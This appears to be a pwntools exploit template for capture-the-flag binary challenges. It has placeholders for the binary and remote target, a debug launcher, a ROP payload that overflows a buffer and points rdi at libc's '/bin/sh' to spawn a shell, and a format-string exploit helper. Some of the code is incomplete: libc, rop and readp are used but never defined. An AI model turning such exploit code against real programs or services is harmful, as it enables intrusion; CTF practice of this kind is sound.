#!/usr/bin/env python3
from pwn import *

binary = "./{bin_name}"
run_args = []
remote_addr = "remote"
remote_port = 1337

elf = context.binary = ELF(binary, checksec=False)
#libc = ELF("./libc.so.6", checksec=False)
#rop = ROP(elf)

gs = """
break *main
continue
"""

def run():
    if args.REMOTE:
        return remote(remote_addr, remote_port)
    elif args.GDB:
        context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
        try:
            return gdb.debug(args=[binary, *run_args], gdbscript=gs)
        except ValueError:
            print("ERROR: tmux not active")
        exit(1)
    else:
        return elf.process(argv=run_args)

p = run()

##### Pwn #####
p.recvuntil(b'> ', drop=True)

### ROP ###
libc.address = readp - libc.sym['read']
payload = flat(
    b'A'*0x40,
    p64(rop.rdi.address),
    p64(next(libc.search(b'/bin/sh'))),
)

### Format string ###
# https://agrohacksstuff.io/posts/pwntools-tricks-and-examples/
# Previous recv might impact the fmtstr_payload function (so make sure to add it)

def fmt_exploit(payload):
    p = run()
    p.sendline(b'3')
    p.recvuntil(b'Insert your username to verify it: ')
    p.sendline(payload)
    res = p.recvuntil(b'\n[-] Sorry', drop=True)
    return res

format_string = FmtStr(execute_fmt=fmt_exploit)

